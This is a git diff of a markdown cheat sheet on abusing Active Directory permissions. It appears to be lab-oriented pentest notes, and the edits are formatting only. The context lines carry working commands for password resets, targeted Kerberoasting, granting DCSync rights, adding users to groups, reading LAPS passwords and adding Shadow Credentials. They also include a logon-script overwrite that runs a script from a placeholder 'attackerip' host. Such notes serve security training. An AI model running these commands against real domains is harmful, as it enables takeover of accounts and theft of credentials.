@@ -34,7 +34,10 @@ Set-DomainUserPassword -Identity studentadmin -AccountPassword (ConvertTo-Secure
 ```
 
 ### Change password with credential
-_Note: Need to know owned user's password_
+
+>[!note]
+>Need to know owned user's password
+
 ```powershell
 # Create PSCredential Object
 $username='contoso\administrator'
@@ -47,6 +50,7 @@ Set-DomainUserPassword -Identity studentadmin -Domain contoso.local -AccountPass
 
 ### Targeted Kerberoast
 This technique will update `ServicePrincipalName` of a user object. Make sure to have a write permission on the user's attributes.
+
 ```powershell
 # Set SPN
 ## Windows
@@ -57,17 +61,20 @@ Set-DomainObject -Identity sqlsvc -Clear serviceprincipalname
 ```
 
 There is also a repo [targetedKerberoast](https://github.com/ShutdownRepo/targetedKerberoast) to automatically discover ACLs from the current user context against other domain objects looking for _Write_ permission on `servicePrincipalName` attribute. 
+
 ```bash
 python3 targetedKerberoast.py -u jsparrow -p Password123 -d range.net --dc-ip 10.10.10.10
 ```
 
 ### Add DCSync Privilege to object
+
 ```powershell
 Add-DomainObjectAcl -TargetIdentity "DC=contoso,DC=local" -PrincipalIdentity studentuser -Rights DCSync
 ```
 
 ### Add Users to Group
 This command will add specific principal to a group that exists in the domain. _Note that there are several tools to perform this. Below are some of the methods that can be used. Checkout this cool tool [bloodyAD](https://github.com/CravateRouge/bloodyAD)_
+
 ```powershell
 # PowerView
 Add-DomainGroupMember -Identity cadmins -Members lowpriv
@@ -78,12 +85,14 @@ net.exe group 'cadmins' lowpriv /add /domain
 
 ### Overwrite Logon Script
 Logon Script will run everytime user logged in._(note: use ad module)_
+
 ```powershell
 Set-ADObject -SamAccountName  -PropertyName scriptpath -PropertyValue "\\attackerip\script.ps1"
 ```
 
 ### Read LAPS
 This will only possible if you have _AllExtendedRights_ permission on a computer object.
+
 ```powershell
 # PowerView
 Get-DomainComputer -Properties ms-mcs-admpwd
@@ -92,6 +101,7 @@ Get-DomainComputer -LAPS
 
 ### Shadow Credentials
 There is an attribute called `msDS_KeyCredentialLink` where raw public keys can be set. When trying to pre-authenticate with PKINIT, the KDC will check that the authenticating user has a matching private key, and a TGT will be sent if there is a match. The attribute could be controlled if the controlled account has a privilege to write on the account attributes. 
+
 ```bash
 # Whisker
 Whisker.exe add /target:lowpriv /domain:range.net /dc:192.168.86.182 /path:cert.pfx /password:"pfx-password"
